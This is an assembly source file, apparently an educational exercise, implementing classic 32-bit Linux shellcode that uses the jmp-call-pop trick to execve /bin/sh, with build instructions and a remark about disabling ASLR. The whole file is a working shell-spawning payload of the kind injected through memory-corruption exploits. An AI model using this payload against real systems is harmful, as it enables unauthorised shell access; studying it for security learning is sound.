;
; file: execve.asm
; author: Ken Ko
;
; description: runs a /bin/sh shell using execve. turn off ASLR, thanks.
;
; compile:	nasm -felf execve.asm && ld -m elf_i386 -o execve execve.o
; 

	SECTION .text           ; code section
        global main             ; make label available to linker as invoked by gcc
        global _start           ; make label available to linker w/ default entry
main:                           ; standard  gcc  entry point
_start:
	xor eax,eax		; clean up registers
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	jmp short ender
	
	starter:
	
	pop ebx			; get address of string "/bin/sh#AAAABBBB"
	xor eax,eax		; clean up registers	

	mov byte [ebx+7 ], al	; put a NULL in N	
	mov [ebx+8 ], ebx	; put address of the string in AAAA
	mov [ebx+12], eax	; put 4 NULL in BBBB

	mov al, 11		; syscall for execve
	lea ecx, [ebx+8]	; load the address of the string location
	lea edx, [ebx+12]	; load the address of the NULLs
	int 0x80		; enter kernel mode

	xor eax,eax
	xor ebx,ebx
	mov byte al, 0x1
	int 0x80

	ender:
	call starter		; put the address of the string on the stack
	db '/bin/sh#AAAABBBB'
